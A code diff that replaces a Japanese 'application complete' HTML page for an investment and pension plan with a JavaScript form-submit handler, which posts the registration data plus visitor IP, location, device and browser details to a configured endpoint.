@@ -1,117 +1,34 @@
-<!DOCTYPE html>
-<html lang="ja">
-<head>
-<meta charset="UTF-8">
-<title>申請完了</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+document.getElementById("registrationForm").addEventListener("submit",function(e){
 
-<style>
+e.preventDefault()
 
-body{
-font-family:"Hiragino Kaku Gothic ProN", Arial, sans-serif;
-background:#f5f6fa;
-margin:0;
-}
+const formData=new FormData(this)
 
-.header{
-background:#0b3a63;
-color:white;
-text-align:center;
-padding:20px;
-font-size:22px;
-font-weight:bold;
-line-height:1.6;
-}
+formData.append("client_id","C"+Date.now())
+formData.append("ip",clientIP)
+formData.append("country",clientCountry)
+formData.append("city",clientCity)
+formData.append("device",getDevice())
+formData.append("browser",getBrowser())
 
-.container{
-max-width:600px;
-margin:40px auto;
-background:white;
-padding:40px;
-border-radius:10px;
-box-shadow:0 6px 25px rgba(0,0,0,0.1);
-text-align:center;
-}
+fetch(scriptURL,{
+method:"POST",
+body:formData
+})
+.then(response => response.text())
+.then(data => {
 
-.success-icon{
-font-size:60px;
-color:#28a745;
-margin-bottom:20px;
-}
+console.log("送信成功:",data)
 
-.title{
-font-size:22px;
-font-weight:bold;
-margin-bottom:15px;
-}
+window.location.href="success.html"
 
-.text{
-font-size:15px;
-color:#555;
-line-height:1.7;
-}
+})
+.catch(error => {
 
-button{
-margin-top:30px;
-padding:12px 25px;
-background:#0b3a63;
-color:white;
-border:none;
-border-radius:6px;
-font-size:16px;
-cursor:pointer;
-}
+console.error(error)
 
-button:hover{
-background:#083252;
-}
+alert("送信に失敗しました。もう一度お試しください。")
 
-.footer{
-margin-top:30px;
-font-size:12px;
-color:#888;
-}
+})
 
-</style>
-
-</head>
-
-<body>
-
-<div class="header">
-資産運用プランB<br>
-年金プラン申請書
-</div>
-
-<div class="container">
-
-<div class="success-icon">✔</div>
-
-<div class="title">
-申請が完了しました
-</div>
-
-<div class="text">
-
-この度は資産運用プランBへの申請ありがとうございます。<br><br>
-
-ご登録内容を確認後、担当者より<br>
-お電話またはメールにてご連絡させていただきます。<br><br>
-
-通常、1営業日以内にご連絡いたしますので<br>
-しばらくお待ちください。
-
-</div>
-
-<button onclick="location.href='index.html'">
-トップページへ戻る
-</button>
-
-<div class="footer">
-© 資産運用プランB
-</div>
-
-</div>
-
-</body>
-</html>
+})
